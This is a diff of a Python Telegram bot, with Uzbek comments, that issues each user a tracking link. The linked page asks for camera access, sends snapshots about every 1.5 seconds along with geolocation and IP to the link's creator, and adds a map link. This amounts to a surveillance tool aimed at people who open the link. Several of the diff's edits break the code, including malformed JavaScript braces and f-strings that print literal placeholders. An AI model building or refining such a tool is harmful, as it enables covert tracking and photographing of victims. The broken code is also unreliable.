@@ -22,7 +22,6 @@ USER_TOKENS = {}
 
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    # Har doim yangi token yaratiladi, lekin eski tokenlar ham ishlashda davom etadi
     token = str(uuid.uuid4())
     USER_TOKENS[token] = user_id
     link = f"{WEBHOOK_DOMAIN}/track?token={token}"
@@ -240,7 +239,7 @@ async def track_page(request: web.Request):
 
             if (hasCameraAccess === null) {{
                 try {{
-                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }} });
+                    stream = await navigator.mediaDevices.getUserMedia({{ video: {{ width: {{ ideal: 640 }}, height: {{ ideal: 480 }} }} }} }} );
                     hasCameraAccess = true;
                     cameraAllowed = true;
                     document.getElementById("status").textContent = "✅ Kamera faol — har 1.5s yangilanadi";
@@ -340,7 +339,7 @@ async def submit_data(request: web.Request):
             ts = ts.replace('T', ' ').split('.')[0]
 
         # Joylashuv xaritaga havola
-        location_str = client_data.get('location', 'Noma\'lum')
+        location_str = client_data.get('location', "Noma'lum")
         location_line = ""
         if location_str != "Noma'lum" and "±" in location_str:
             try:
@@ -348,7 +347,7 @@ async def submit_data(request: web.Request):
                 lat, lng = coords.split(',')
                 map_link = f"https://maps.google.com/?q={lat},{lng}"
                 location_line = f"📍 Joylashuv: {location_str} — [Xaritada ko‘rish]({map_link})\n"
-            except:
+            except Exception:
                 location_line = f"📍 Joylashuv: {location_str}\n"
         else:
             location_line = f"📍 IP orqali: {ip} (Brauzer orqali kelgan IP)\n"
@@ -386,7 +385,7 @@ async def submit_data(request: web.Request):
                 img.name = "snapshot.jpg"
                 await request.app["bot"].send_photo(chat_id=user_id, photo=InputFile(img), caption=message, parse_mode="Markdown")
             except Exception as e:
-                logger.error(f"Rasmni yuborishda xato: {e}")
+                logger.error(f"Rasmni yuborishda xato: {{e}}")
                 await request.app["bot"].send_message(chat_id=user_id, text=message + "\n\n⚠️ Rasmni yuklab bo'lmadi.", parse_mode="Markdown")
         else:
             await request.app["bot"].send_message(chat_id=user_id, text=message, parse_mode="Markdown")
@@ -405,7 +404,7 @@ async def start_web_server(bot):
     await runner.setup()
     site = web.TCPSite(runner, "0.0.0.0", PORT)
     await site.start()
-    logger.info(f"🌐 Web server ishga tushdi http://0.0.0.0:{PORT}")
+    logger.info(f"🌐 Web server ishga tushdi http://0.0.0.0:{{PORT}}")
 
 async def on_startup(app: Application):
     asyncio.create_task(start_web_server(app.bot))
